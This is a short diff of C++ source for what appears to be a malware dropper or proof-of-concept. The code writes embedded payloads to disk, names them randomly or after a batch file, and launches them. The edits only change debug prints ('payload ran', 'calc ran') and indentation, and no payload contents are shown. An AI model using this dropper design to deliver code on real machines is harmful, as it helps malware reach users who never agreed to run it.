@@ -211,10 +211,9 @@ int main(int argc, char* argv[])
 	#endif
 
 		drop(size3, data3, name3);
-		std::cout << "payload ran\n";
+		std::cout << "This is size3: " << size3 << "\n";
 		drop(size1, data1, name1);
-		std::cout << "calc ran\n";
-
+		std::cout << "This is size1: " << size1 << "\n";
 
 		bool result = non_exe_launch(name3);
 
@@ -357,20 +356,20 @@ void set_name(std::uint64_t os_version)
 	else if (os_version == 10) {
 
 #ifdef RANDOM_NAME
-	int valid = 0;
-	srand(time(NULL));
-	while (valid < NAME_SIZE)
-	{
-		char c = rand();
-		if (c >= 'a' && c <= 'z')
+		int valid = 0;
+		srand(time(NULL));
+		while (valid < NAME_SIZE)
 		{
-			name1.push_back(c);
+			char c = rand();
+			if (c >= 'a' && c <= 'z')
+			{
+				name1.push_back(c);
+			}
 		}
-	}
 #else
 
-	name1+=DROPPER_OUTPUT;
-	name3+="\\file_move.bat";
+		name1+=DROPPER_OUTPUT;
+		name3+="\\file_move.bat";
 #endif
 	}
 
